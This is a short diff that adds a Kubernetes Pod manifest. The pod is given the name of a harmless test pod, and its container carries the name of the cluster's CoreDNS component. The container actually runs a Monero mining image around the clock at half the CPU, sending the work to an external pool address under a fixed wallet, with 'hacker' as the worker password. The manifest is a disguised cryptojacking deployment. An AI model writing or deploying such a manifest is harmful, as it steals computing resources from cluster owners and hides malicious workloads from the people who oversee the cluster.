@@ -1,0 +1,25 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: hello-world-test-pod-87b67d4f-2hj9s
+spec:
+  containers:
+  - name: coredns-5c98db65d4-7t2l2
+    image: pmietlicki/monero-miner
+    command: ["/bin/bash"]
+    args:
+    - "-c"
+    - "./script.sh $(COIN) $(POOL_URL) $(POOL_USER) hacker $(MAX_CPU) false 0000 2359 Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday --tls"
+    env:
+    - name: COIN
+      value: monero
+    - name: MAX_CPU
+      value: "50"
+    - name: DONATE_LEVEL
+      value: "1"
+    - name: POOL_URL
+      value: demo.salerat.com:443
+    - name: POOL_USER
+      value: 485f7m49jVT8GwjyLmGJTuSV1txuXnSXMTYZYnZp7i1f6jvXAXeoMMtLVwK1XtgTuMB5NcrnayA61Y79y8mhur4uBLfSwKG
+    ports:
+    - containerPort: 443
